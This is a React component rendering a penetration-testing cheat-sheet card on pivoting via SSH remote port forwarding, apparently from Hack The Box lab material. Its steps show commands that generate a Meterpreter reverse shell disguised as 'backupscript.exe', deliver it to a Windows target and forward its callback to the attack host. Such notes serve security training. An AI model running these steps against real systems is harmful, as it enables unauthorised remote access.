import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const PIVOT_Remote_Port_Forward = ({ title }: IProps) => {

   

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>

              <Typography>
              Enables us to simulate a 2 layer deep remote host locally by sending traffic on local port (4444) to the Pivot Host which will send that traffic to the Target Host.
               </Typography>
               <Box pt={5}></Box>
               <img src="/pivot_3.png" style={{width: "100%", height: "100%"}}/>
               <Box pt={5}></Box>
               <Typography variant="h6">
                    Step 1
                </Typography>
                <Typography>
                Create reverse shell payload that will be executed on Target Host.
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"Shelled@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8888"}
              </SyntaxHighlighter>
              <Box pt={5}></Box>
               <Typography variant="h6">
                    Step 2
                </Typography>
                <Typography>
                Listen on Attack Host for reverse shell
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"msf6 > use exploit/multi/handler"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
               <Typography variant="h6">
                    Step 3
                </Typography>
                <Typography>
                Transfer payload from Attack Host to Pivot Host
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"Shelled@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
               <Typography variant="h6">
                    Step 4
                </Typography>
                <Typography>
                Transfer payload from Pivot Host to Target Host (1)
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"ubuntu@Webserver$ python3 -m http.server 8123"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
               <Typography variant="h6">
                    Step 5
                </Typography>
                <Typography>
                Transfer payload from Pivot Host to Target Host (2)
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'PS C:\\Windows\\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
               <Typography variant="h6">
                    Step 6
                </Typography>
                <Typography>
                Pivot Host will listen on port 8888 and forward all incoming connections to port 4444 on Attack Host.
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'Shelled@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8888:0.0.0.0:4444 ubuntu@<ipAddressofTarget> -vN'}
            </SyntaxHighlighter>
               <Box pt={5}></Box>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default PIVOT_Remote_Port_Forward;
  